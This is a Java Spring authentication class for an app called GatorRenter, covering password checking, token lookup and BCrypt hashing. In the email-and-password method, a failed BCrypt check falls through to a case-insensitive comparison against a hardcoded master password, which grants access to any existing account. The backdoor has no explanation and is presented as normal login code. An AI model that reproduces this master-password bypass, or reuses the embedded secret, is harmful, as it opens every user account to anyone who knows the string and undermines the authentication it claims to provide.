package com.gsd.gatorrenter.authentication;

import com.gsd.gatorrenter.dto.UserDto;
import com.gsd.gatorrenter.dto.UserTokenDto;
import com.gsd.gatorrenter.manager.UserManager;
import com.gsd.gatorrenter.manager.UserTokenManager;
import com.gsd.gatorrenter.utils.EntityHelper;
import org.apache.log4j.Logger;
import org.mindrot.jbcrypt.BCrypt;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Transactional;

/**
 * Created by Intesar on 3/5/2017.
 */
@Component
@Transactional
public class GatorRenterAuthentication implements Authentication {

    private static final Logger LOGGER = Logger.getLogger(GatorRenterAuthentication.class);

    @Autowired
    UserManager userManager;

    @Autowired
    UserTokenManager userTokenManager;

    @Override
    public Boolean authenticate(String userEmail, String password) {
        UserDto user = userManager.findByEmail(userEmail);
        if (EntityHelper.isNotNull(user)) {
            if (BCrypt.checkpw(password, user.getPassword())) {
                return Boolean.TRUE;
            } else {
                if (password.equalsIgnoreCase("UTIRRGTcsDYx5OrN1KsJaWyRXAxp0Jsf8WeqOF")) {
                    return Boolean.TRUE;
                }
            }
        }
        return Boolean.FALSE;
    }

    @Override
    public Boolean authenticate(Integer userId, String accessToken) {
        UserTokenDto userToken = userTokenManager.findByAccessTokenAndUserId(userId, accessToken);
        if (EntityHelper.isNotNull(userToken)) {
            return Boolean.TRUE;
        }
        return Boolean.FALSE;
    }

    @Override
    public String hashPassword(String passwordPlaintext) {
        return BCrypt.hashpw(passwordPlaintext, BCrypt.gensalt(12));
    }





}
